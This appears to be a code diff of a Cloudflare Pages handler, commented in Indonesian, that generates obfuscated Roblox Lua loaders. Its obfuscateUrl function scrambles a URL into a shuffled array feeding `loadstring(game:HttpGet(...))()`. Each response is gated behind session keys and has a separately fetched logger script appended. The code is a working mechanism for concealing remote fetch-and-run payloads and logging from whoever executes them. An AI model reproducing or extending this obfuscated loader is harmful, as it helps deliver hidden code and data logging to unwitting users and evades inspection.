@@ -51,7 +51,7 @@ async function sendSecurityLogToLogJs(message, ip, type) {
     }
 }
 
-// ========== FUNGSI OBFUSCATE URL ==========
+// ========== FUNGSI OBFUSCATE URL (SAMA PERSIS DENGAN VERSI NODE.JS) ==========
 function obfuscateUrl(url) {
     // Pastikan URL hanya mengandung karakter aman
     const safeUrl = url.trim();
@@ -104,14 +104,12 @@ function obfuscateUrl(url) {
         }
     } while (luaKeywords.includes(varName));
 
-    // Concat acak
+    // Concat acak - SAMA PERSIS DENGAN VERSI NODE.JS
     const concatStr = orderMap.map(i => `${varName}[${i}]`).join('..');
 
-    // ========== BUNGKUS DENGAN TASK.SPAWN ==========
-    return `task.spawn(function()
-local ${varName}={${arrayStr}}
-loadstring(game:HttpGet(${concatStr}))()
-end)`;
+    // ========== KEMBALIKAN TANPA TASK.SPAWN ==========
+    // Biarkan seperti aslinya: local x={...}loadstring(game:HttpGet(...))()
+    return `local ${varName}={${arrayStr}}loadstring(game:HttpGet(${concatStr}))()`;
 }
 
 // ========== HANDLER CLOUDFLARE PAGES ==========
@@ -140,7 +138,7 @@ export async function onRequest(context) {
         return new Response(null, { status: 204, headers });
     }
 
-    // Hanya allow GET
+    // Hanya allow GET - SAMA PERSIS DENGAN VERSI NODE.JS
     if (request.method !== 'GET') {
         return new Response('Method Not Allowed', { status: 405, headers });
     }
@@ -171,7 +169,6 @@ export async function onRequest(context) {
 
     // ========== PARSE URL ==========
     const url = new URL(request.url);
-    const urlParts = url.pathname;
     const queryString = url.search || "";
     const params = queryString ? queryString.replace('?', '').split('.') : [];
 
@@ -311,9 +308,8 @@ export async function onRequest(context) {
             const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
             const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
 
-            // ========== BUNGKUS DENGAN TASK.SPAWN ==========
-            const obfuscatedUrl = obfuscateUrl(nextUrl);
-            const luaScript = obfuscatedUrl + "\n" + (loggerScript || '');
+            // ========== KEMBALIKAN SAMA PERSIS DENGAN VERSI NODE.JS ==========
+            const luaScript = obfuscateUrl(nextUrl) + "\n" + (loggerScript || '');
             return new Response(luaScript, {
                 status: 200,
                 headers
@@ -340,4 +336,4 @@ export async function onRequest(context) {
             headers
         });
     }
-    }
+}
